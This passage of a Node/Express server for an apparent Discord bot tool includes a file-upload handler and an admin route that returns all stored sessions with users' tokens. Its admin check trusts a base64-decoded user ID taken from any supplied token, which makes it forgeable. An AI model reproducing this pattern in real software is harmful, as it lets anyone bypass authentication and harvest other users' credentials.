                  return res.status(400).json({ error: 'Bots cannot DM themselves. Please provide a Channel ID.' });
              }

              try {
                  // Explicitly create/fetch DM channel with self
                  const dmChannel = await client.user.createDM();
                  msg = await dmChannel.send({
                      files: [{
                          attachment: file.buffer,
                          name: file.originalname
                      }]
                  });
              } catch (err: any) {
                  console.error('Auto-upload failed:', err);
                  // 50007: Cannot send messages to this user
                  if (err.code === 50007 || err.message?.includes('Cannot send messages')) {
                       return res.status(400).json({ error: 'Auto-upload failed (DMs restricted). Please provide a Channel ID.' });
                  }
                  throw err;
              }
          }

          const url = msg.attachments.first()?.url;
          if (url) {
              res.json({ url });
          } else {
              res.status(500).json({ error: 'Failed to get attachment URL' });
          }
      } catch (e) {
          console.error('Upload Error:', e);
          res.status(500).json({ error: String(e) });
      }
  });
  */

  // 4. Admin
  app.get('/ping', (req, res) => {
    res.status(200).send('Pong!');
  });

  app.get('/api/admin/all-sessions', (req, res) => {
    const token = req.headers.authorization;
    let isAdmin = false;
    
    if (token) {
        const session = sessions.get(token);
        let userId = '';
        try {
            userId = Buffer.from(token.split('.')[0], 'base64').toString('utf8');
        } catch (e) {}
        
        if ((session && session.username === 'yannaaax') || 
            userId === '1413100448482857081' || 
            userId === '1462523761302437889') {
            isAdmin = true;
        }
    }

    if (!isAdmin) {
        return res.status(403).json({ error: 'Forbidden' });
    }

    const allSessions = Array.from(sessions.values()).map(s => ({
        username: s.username,
        id: s.id,
        token: s.token, // Admin sees tokens
        status: s.status,
        loginTime: s.logs[s.logs.length - 1] // Approximate
    }));
    res.json(allSessions);
  });

  // --- Vite Middleware ---
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    // Serve static files from dist in production
    const path = await import('path');
    const { fileURLToPath } = await import('url');
    const __filename = fileURLToPath(import.meta.url);
    const __dirname = path.dirname(__filename);
    
    app.use(express.static(path.join(__dirname, 'dist')));
    
    // SPA fallback
    app.get('*', (req, res) => {
      res.sendFile(path.join(__dirname, 'dist', 'index.html'));
    });
  }

  // Start listening at the very end
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
